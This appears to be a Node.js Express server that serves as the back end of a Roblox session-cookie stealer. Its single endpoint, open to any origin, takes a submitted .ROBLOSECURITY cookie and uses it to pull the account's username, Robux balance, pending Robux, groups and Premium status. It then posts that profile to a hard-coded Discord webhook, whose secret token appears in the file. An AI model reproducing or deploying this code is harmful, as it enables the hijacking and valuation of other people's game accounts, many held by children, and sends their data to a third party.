const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1393233820685434921/3aIHe5IE3Q23BYDwW_J6Q6jcLEPo2SP7Okqbo4cGepA4_Yk6ngHpYkhCu46E2XNjGcrF";

app.post("/send-info", async (req, res) => {
    const { cookie } = req.body;
    if (!cookie || !cookie.startsWith("_|")) {
        return res.status(400).json({ error: "Invalid or missing .ROBLOSECURITY cookie." });
    }

    try {
        // Get basic user info
        const userInfo = await fetch("https://users.roblox.com/v1/users/authenticated", {
            headers: {
                Cookie: `.ROBLOSECURITY=${cookie}`,
            },
        }).then(r => r.json());

        if (!userInfo.name) return res.status(403).json({ error: "Invalid or expired cookie." });

        // Get Robux balance
        const robuxData = await fetch("https://economy.roblox.com/v1/user/currency", {
            headers: {
                Cookie: `.ROBLOSECURITY=${cookie}`,
            },
        }).then(r => r.json());

        // Get pending Robux
        const pendingData = await fetch("https://economy.roblox.com/v1/user/currency/pending", {
            headers: {
                Cookie: `.ROBLOSECURITY=${cookie}`,
            },
        }).then(r => r.json());

        // Get group count
        const groupsData = await fetch(`https://groups.roblox.com/v2/users/${userInfo.id}/groups/roles`, {
            headers: {
                Cookie: `.ROBLOSECURITY=${cookie}`,
            },
        }).then(r => r.json());

        // Send data to Discord webhook
        const embed = {
            title: "Roblox Account Info",
            color: 0x00ff00,
            fields: [
                { name: "Username", value: userInfo.name, inline: true },
                { name: "User ID", value: `${userInfo.id}`, inline: true },
                { name: "Robux", value: `${robuxData.robux}`, inline: true },
                { name: "Pending Robux", value: `${pendingData.robux}`, inline: true },
                { name: "Group Count", value: `${groupsData.data.length}`, inline: true },
                { name: "Premium", value: userInfo.isPremium ? "✅ Yes" : "❌ No", inline: true }
            ],
            footer: { text: `Retrieved at ${new Date().toLocaleString()}` }
        };

        await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });

        res.json({ success: true, user: userInfo.name });
    } catch (err) {
        console.error("Error:", err);
        res.status(500).json({ error: "Internal server error." });
    }
});
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
